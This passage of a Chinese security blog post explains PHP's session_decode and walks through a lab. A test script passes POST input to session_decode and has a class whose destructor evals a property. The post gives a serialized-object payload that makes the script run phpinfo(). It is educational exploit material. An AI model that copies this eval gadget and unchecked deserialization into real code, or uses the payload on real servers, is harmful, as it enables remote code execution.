<h2 id="session-decode"><a href="#session-decode" class="headerlink" title="session_decode"></a>session_decode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_decode</span>(<span class="keyword">string</span> `<span class="variable">$data</span>`): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>

<p><strong>session_decode()</strong> 对 <code>$data</code> 参数中的已经序列化的会话数据进行解码， 并且使用解码后的数据<code>填充 $_SESSION 超级全局变量</code>。</p>
<p>请注意，这里的反序列化方法不同于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a> 函数。 序列化方法是 PHP 内置的，并且可以通过 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.serialize-handler">session.serialize_handler</a> 配置项进行修改。</p>
<h4 id="实验一-2"><a href="#实验一-2" class="headerlink" title="实验一"></a>实验一</h4><p>创建一个session.php文件，内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();   </span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionData</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_decode</span>(<span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zixyd</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: data=username|s:5:&quot;zixyd&quot;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─# cat sess_l177lcnaktemebo1dr0uq0c2om</span><br><span class="line">username|s:5:&quot;zixyd&quot;;   </span><br></pre></td></tr></table></figure>

<p>成功将<code>username|s:5:&quot;zixyd&quot;;   </code>写入到session文件中，</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107212251.png"></p>
<p>如果写入的是恶意数据呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: data=shell|O:5:&quot;zixyd&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─# cat sess_l177lcnaktemebo1dr0uq0c2om</span><br><span class="line">username|s:5:&quot;zixyd&quot;;shell|O:5:&quot;zixyd&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;  </span><br></pre></td></tr></table></figure>

<p>成功执行<code>phpinfo();</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107212701.png"></p>
<p>可以看到当<code>session_decode</code>函数的值是可控时，是非常危险的</p>
</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-07</span><i class="fa fa-tag"></i><a class="tag" href="/tags/unSerialize/" title="unSerialize">unSerialize </a><i class="fa fa-tag"></i><a class="tag" href="/tags/include/" title="include">include </a><span class="leancloud_visitors"></span><span>About 4047 words, 13 min 29 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%0Ahttps://zIxyd.github.io/2024/01/07/session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2024/01/08/pearcmd/" title="pearcmd.php">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/01/01/Analytics/" title="Analytics(HTB)">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>